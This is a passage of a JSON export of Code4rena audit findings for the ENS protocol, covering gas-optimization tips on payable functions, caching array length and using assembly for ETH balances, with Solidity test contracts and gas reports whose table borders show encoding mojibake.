â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ isNotPayable       â”† 198             â”† 198 â”† 198    â”† 198 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract1 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 29681              â”† 178             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ isPayable          â”† 174             â”† 174 â”† 174    â”† 174 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\n```\n\n### Lines\n\nFor full list of line references, see warden's [original submission](https://github.com/code-423n4/2022-07-ens-findings/issues/176).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "#g-10-consider-marking-functions-as-payable",
      "tags": [],
      "finders": []
    },
    {
      "id": "5568",
      "title": "[G-09] Cache array length during for loop definition.",
      "impact": "GAS",
      "content": "\nA typical for loop definition may look like: `for (uint256 i; i < arr.length; i++){}`. Instead of using `array.length`, cache the array length before the loop, and use the cached value to safe gas. This will avoid an `MLOAD` every loop for arrays stored in memory and an `SLOAD` for arrays stored in storage. This can have significant gas savings for arrays with a large length, especially if the array is stored in storage.\n\n```js\n\ncontract GasTest is DSTest {\n    Contract0 c0;\n    Contract1 c1;\n    Contract2 c2;\n    Contract3 c3;\n\n    function setUp() public {\n        c0 = new Contract0();\n        c1 = new Contract1();\n        c2 = new Contract2();\n        c3 = new Contract3();\n    }\n\n    function testGas() public view {\n        uint256[] memory arr = new uint256[](10);\n        c0.nonCachedMemoryListLength(arr);\n        c1.cachedMemoryListLength(arr);\n        c2.nonCachedStorageListLength();\n        c3.cachedStorageListLength();\n    }\n}\n\ncontract Contract0 {\n    function nonCachedMemoryListLength(uint256[] memory arr) public pure {\n        uint256 j;\n        for (uint256 i; i < arr.length; i++) {\n            j = arr[i] + 10;\n        }\n    }\n}\n\ncontract Contract1 {\n    function cachedMemoryListLength(uint256[] memory arr) public pure {\n        uint256 j;\n\n        uint256 length = arr.length;\n        for (uint256 i; i < length; i++) {\n            j = arr[i] + 10;\n        }\n    }\n}\n\ncontract Contract2 {\n    uint256[] arr = new uint256[](10);\n\n    function nonCachedStorageListLength() public view {\n        uint256 j;\n        for (uint256 i; i < arr.length; i++) {\n            j = arr[i] + 10;\n        }\n    }\n}\n\ncontract Contract3 {\n    uint256[] arr = new uint256[](10);\n\n    function cachedStorageListLength() public view {\n        uint256 j;\n        uint256 length = arr.length;\n\n        for (uint256 i; i < length; i++) {\n            j = arr[i] + 10;\n        }\n    }\n}\n\n\n```\n\n### Gas Report\n\n```js\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ src/test/GasTest.t.sol:Contract0 contract â”†                 â”†      â”†        â”†      â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost                           â”† Deployment Size â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 128171                                    â”† 672             â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name                             â”† min             â”† avg  â”† median â”† max  â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ nonCachedMemoryListLength                 â”† 3755            â”† 3755 â”† 3755   â”† 3755 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ src/test/GasTest.t.sol:Contract1 contract â”†                 â”†      â”†        â”†      â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost                           â”† Deployment Size â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 128777                                    â”† 675             â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name                             â”† min             â”† avg  â”† median â”† max  â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ cachedMemoryListLength                    â”† 3733            â”† 3733 â”† 3733   â”† 3733 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ src/test/GasTest.t.sol:Contract2 contract â”†                 â”†       â”†        â”†       â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost                           â”† Deployment Size â”†       â”†        â”†       â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 118474                                    â”† 539             â”†       â”†        â”†       â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name                             â”† min             â”† avg   â”† median â”† max   â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ nonCachedStorageListLength                â”† 27979           â”† 27979 â”† 27979  â”† 27979 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ src/test/GasTest.t.sol:Contract3 contract â”†                 â”†       â”†        â”†       â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost                           â”† Deployment Size â”†       â”†        â”†       â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 118674                                    â”† 540             â”†       â”†        â”†       â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name                             â”† min             â”† avg   â”† median â”† max   â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ cachedStorageListLength                   â”† 26984           â”† 26984 â”† 26984  â”† 26984 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\n\n```\n\n### Lines\n\n*   DNSSECImpl.sol:93\n\n*   ETHRegistrarController.sol:256\n\n*   ERC1155Fuse.sol:92\n\n*   ERC1155Fuse.sol:205\n\n*   RRUtils.sol:310\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "#g-09-cache-array-length-during-for-loop-definition",
      "tags": [],
      "finders": []
    },
    {
      "id": "5567",
      "title": "[G-08] Use assembly when getting a contract's balance of ETH.",
      "impact": "GAS",
      "content": "\nYou can use `selfbalance()` instead of `address(this).balance` when getting your contract's balance of ETH to save gas. Additionally, you can use `balance(address)` instead of `address.balance()` when getting an external contract's balance of ETH.\n\n```js\n\ncontract GasTest is DSTest {\n    Contract0 c0;\n    Contract1 c1;\n    Contract2 c2;\n    Contract3 c3;\n\n    function setUp() public {\n        c0 = new Contract0();\n        c1 = new Contract1();\n        c2 = new Contract2();\n        c3 = new Contract3();\n    }\n\n    function testGas() public {\n        c0.addressInternalBalance();\n        c1.assemblyInternalBalance();\n        c2.addressExternalBalance(address(this));\n        c3.assemblyExternalBalance(address(this));\n    }\n}\n\ncontract Contract0 {\n    function addressInternalBalance() public returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract Contract1 {\n    function assemblyInternalBalance() public returns (uint256) {\n        assembly {\n            let c := selfbalance()\n            mstore(0x00, c)\n            return(0x00, 0x20)\n        }\n    }\n}\n\ncontract Contract2 {\n    function addressExternalBalance(address addr) public {\n        uint256 bal = address(addr).balance;\n        bal++;\n    }\n}\n\ncontract Contract3 {\n    function assemblyExternalBalance(address addr) public {\n        uint256 bal;\n        assembly {\n            bal := balance(addr)\n        }\n        bal++;\n    }\n}\n```\n\n### Gas Report\n\n```js\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract0 contract     â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost        â”† Deployment Size â”†     